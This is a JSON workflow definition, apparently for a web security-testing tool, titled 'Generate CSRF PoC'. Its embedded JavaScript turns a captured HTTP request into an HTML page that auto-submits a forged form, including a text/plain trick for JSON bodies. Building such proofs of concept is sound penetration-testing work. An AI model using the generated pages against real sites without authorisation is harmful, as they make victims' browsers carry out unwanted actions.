{
  "description": "Generate CSRF PoC from the request",
  "edition": 2,
  "graph": {
    "edges": [
      {
        "source": {
          "exec_alias": "exec",
          "node_id": 0
        },
        "target": {
          "exec_alias": "exec",
          "node_id": 2
        }
      },
      {
        "source": {
          "exec_alias": "exec",
          "node_id": 2
        },
        "target": {
          "exec_alias": "exec",
          "node_id": 1
        }
      }
    ],
    "nodes": [
      {
        "alias": "convert_start",
        "definition_id": "cyware/convert-start",
        "display": {
          "x": 0,
          "y": 0
        },
        "id": 0,
        "inputs": [],
        "name": "Convert Start",
        "version": "0.1.0"
      },
      {
        "alias": "convert_end",
        "definition_id": "cyware/convert-end",
        "display": {
          "x": 0,
          "y": 190
        },
        "id": 1,
        "inputs": [
          {
            "alias": "data",
            "value": {
              "data": "$javascript.data",
              "kind": "ref"
            }
          }
        ],
        "name": "Convert End",
        "version": "0.1.0"
      },
      {
        "alias": "javascript",
        "definition_id": "cyware/code-js",
        "display": {
          "x": 0,
          "y": 100
        },
        "id": 2,
        "inputs": [
          {
            "alias": "data",
            "value": {
              "data": "$convert_start.data",
              "kind": "ref"
            }
          },
          {
            "alias": "code",
            "value": {
              "data": "function parseRequest(str) {\r\n  const lines = str.split(/\\r?\\n/);\r\n  const [method, path, version] = lines.shift().split(\" \");\r\n  const headers = {};\r\n  while(lines.length > 0) {\r\n    const line = lines.shift();\r\n    if(line === \"\") {\r\n      break;\r\n    }\r\n    const parts = line.split(\":\");\r\n    const key = parts.shift().toLowerCase();\r\n    const value = parts.join(\":\");\r\n    headers[key] = value.trim();\r\n  }\r\n  const body = lines.join(\"\\r\\n\");\r\n  return {\r\n    method: method.toUpperCase(),\r\n    path,\r\n    version,\r\n    headers,\r\n    body\r\n  };\r\n}\r\n\r\nfunction parseFormData(str) {\r\n  const params = str.split(\"&\");\r\n  const formData = {};\r\n  for(const param of params) {\r\n    const parts = param.split(\"=\");\r\n    const key = parts.shift();\r\n    const value = parts.join(\"=\");\r\n    formData[key] = value;\r\n  }\r\n  return formData;\r\n}\r\n\r\nfunction encodeHTML(str) {\r\n  let result = \"\";\r\n  for(const char of str) {\r\n    result += `&#${char.charCodeAt()};`;\r\n  }\r\n  return result;\r\n}\r\n\r\nconst HTML_TEMPLATE = `<!-- Generated by Generate CSRF PoC workflow of Cyware: https://github.com/cyware/workflows/tree/main/convert/Generate%20CSRF%20PoC -->\r\n<html>\r\n\t<head>\r\n\t\t<title>CSRF PoC</title>\r\n\t</head>\r\n\t<body>\r\n\t\t%FORM%\r\n\t\t<script>\r\n\t\t\tdocument.querySelector(\"form\").submit();\r\n\t\t</script>\r\n\t</body>\r\n</html>\r\n`;\r\n\r\nconst FORM_TEMPLATE = `<form action=\"%URL%\" method=\"%METHOD%\" enctype=\"%ENCTYPE%\">\\n%FIELDS%\\t\\t</form>`;\r\nconst FIELD_TEMPLATE = `\\t\\t\\t<input name=\"%NAME%\" value=\"%VALUE%\">\\n`;\r\n\r\nfunction generateFormDataPoC(request) {\r\n  const formData = parseFormData(request.body);\r\n  let fields = \"\";\r\n  for(const key of Object.keys(formData)) {\r\n    fields += FIELD_TEMPLATE.replace(\"%NAME%\", encodeHTML(key)).replace(\"%VALUE%\", encodeHTML(formData[key]));\r\n  }\n\r\n  const form = FORM_TEMPLATE.replace(\"%URL%\", \"https://\" + encodeHTML(`${request.headers[\"host\"]+request[\"path\"]}`)).replace(\"%METHOD%\", request.method).replace(\"%ENCTYPE%\", \"application/x-www-form-urlencoded\").replace(\"%FIELDS%\", fields);\r\n  return HTML_TEMPLATE.replace(\"%FORM%\", form);\r\n}\r\n\r\nfunction generateJSONPoC(request) {\r\n  const body = request.body.replace(/}\\s*$/, \"\") + ', \"';\r\n  let fields = FIELD_TEMPLATE.replace(\"%NAME%\", encodeHTML(body)).replace(\"%VALUE%\", encodeHTML('\": \"\"}'));\r\n\r\n  const form = FORM_TEMPLATE.replace(\"%URL%\", \"https://\" + encodeHTML(`${request.headers[\"host\"]+request[\"path\"]}`)).replace(\"%METHOD%\", request.method).replace(\"%ENCTYPE%\", \"text/plain\").replace(\"%FIELDS%\", fields);\r\n  return HTML_TEMPLATE.replace(\"%FORM%\", form);\r\n}\r\n\r\n\r\nexport function run(input, sdk) {\r\n  let parsed = sdk.asString(input);\r\n  const request = parseRequest(parsed);\r\n  if(![\"GET\", \"POST\"].includes(request.method)) {\r\n    return `Unexpected method: ${request.method}`;\r\n  }\r\n\r\n  if(!request.headers[\"host\"]) {\r\n    return `Missing Host header: ${parsed}`;\r\n  }\r\n\r\n  const contentType = request.headers[\"content-type\"].split(\";\")[0];\r\n  switch(contentType) {\r\n    case \"application/x-www-form-urlencoded\":\r\n      return generateFormDataPoC(request);\r\n      break;\r\n    case \"application/json\":\r\n      return generateJSONPoC(request);\r\n      break;\r\n    default:\r\n      return `Unexpected Content-Type: ${contentType}. Currently, only application/x-www-form-urlencoded and application/json are supported.`;\r\n  }\r\n}\r\n",
              "kind": "string"
            }
          }
        ],
        "name": "Javascript",
        "version": "0.1.0"
      }
    ]
  },
  "id": "dc4d158c-62e5-4272-8d72-f329a25484a7",
  "kind": "convert",
  "name": "Generate CSRF PoC"
}